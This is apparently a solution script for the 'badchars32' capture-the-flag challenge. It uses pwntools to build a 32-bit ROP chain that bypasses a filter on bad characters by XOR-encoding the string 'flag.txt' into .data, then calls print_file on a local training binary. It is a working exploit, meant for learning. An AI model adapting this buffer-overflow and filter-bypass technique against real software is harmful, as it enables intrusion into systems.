from pwn import *


# blacklist badchars  : 'a', 'g', 'x' , '.'
 



'''
used gadget : 
 

0x080485b9: pop esi; pop edi; pop ebp; ret; 

# ebp will be an address in .data
# esi will be the value used to obtain "flag.txt" after xor operation
# edi will contain an address in  .data 


0x080485bb: pop ebp; ret; # used to pop into ebp the address in .data that we want to xor

0x0804854f: mov DWORD PTR [edi],esi;ret    # gadget used to write 


0x0804839d: pop ebx; ret; # the char used to xor 
0x08048547: xor BYTE PTR [ebp+0x0],bl;ret  # gadget used to bypass the filter on badchars

'''

def convert_into_hex(word):
    '''
    convert string into hex in little endian 
    format
    '''
    new_w = []
    rev_word=word[::-1]
    for i in rev_word:
        
        new_w.append(hex(ord(i))[2:])

    el = "0x" + "".join(new_w)


    return p32(int(el,16))


# replace badchars with z and then xor z with values in order to have "flag.txt" in .data

word1 =  convert_into_hex("flzz")
word2 =  convert_into_hex("ztzt")




def brute_force(letter="z"):
    '''
    this function is used to find the value we need to xor with to obtain 
    the restricted chars a,g,x,.

    We don't want null bytes so we are going to fill with at least 1  valid bytes and we are going to
        duplicate the needed value to obtain a 4 bytes value : 
        ex:  if we need to xor with 0x1 we want to have  \x01\x01\x01\x01 and not 0x1111
    '''
    to_obtain_a=""
    to_obtain_g=""
    to_obtain_x=""
    to_obtain_dot=""
    for i in range(255):
        if chr(ord(letter) ^ i) == 'a':
            to_obtain_a=(hex(i)[2:].zfill(2))*4

        if chr(ord(letter) ^ i) == 'g':
            to_obtain_g=(hex(i)[2:].zfill(2))*4
        
        if chr(ord(letter) ^ i) == 'x':
            to_obtain_x=(hex(i)[2:].zfill(2))*4

        if chr(ord(letter) ^ i) == '.':
            to_obtain_dot=(hex(i)[2:].zfill(2))*4

    return p32(int(to_obtain_a,16)),p32(int(to_obtain_g,16)), p32(int(to_obtain_x,16)), p32(int(to_obtain_dot,16))

give_me_a ,give_me_g, give_me_x, give_me_dot  =brute_force()

print(give_me_x)


p = process('./badchars32')

start_data = 0x804a018
padding = b'A'*44



pop_esi_edi_ebp = p32(0x080485b9)
pop_ebx =p32(0x0804839d)
xor_ebp_bl=p32(0x08048547)
mov_edi_esi=p32(0x0804854f)
pop_ebp =p32(0x080485bb)


call_print_file=p32(0x80483d0)

# first write the value in .data and the used xor on needed value


# write flzz 
rop_chain = padding
rop_chain+=pop_esi_edi_ebp
rop_chain+=word1
rop_chain+=p32(start_data)
rop_chain+=p32(start_data)
rop_chain+=mov_edi_esi


# write ztzt

rop_chain+=pop_esi_edi_ebp
rop_chain+=word2
rop_chain+=p32(start_data+4)
rop_chain+=p32(start_data)
rop_chain+=mov_edi_esi

# replace the first z with a


rop_chain+=pop_ebp
rop_chain+=p32(start_data+2)
rop_chain+=pop_ebx
rop_chain+=(give_me_a)
rop_chain+=xor_ebp_bl

# replace the second z with g


rop_chain+=pop_ebp
rop_chain+=p32(start_data+3)
rop_chain+=pop_ebx
rop_chain+=(give_me_g)
rop_chain+=xor_ebp_bl


# replace the third z with .


rop_chain+=pop_ebp
rop_chain+=p32(start_data+4)
rop_chain+=pop_ebx
rop_chain+=(give_me_dot)
rop_chain+=xor_ebp_bl



# replace the last z with x

rop_chain+=pop_ebp
rop_chain+=p32(start_data+6)
rop_chain+=pop_ebx
rop_chain+=(give_me_x)
rop_chain+=xor_ebp_bl



rop_chain+=call_print_file
rop_chain+=b'ZZZZ'
rop_chain+=p32(start_data)

p.sendlineafter(b'>', rop_chain)

flag=(p.recvall().split(b'\n')[1]).decode()

print(flag)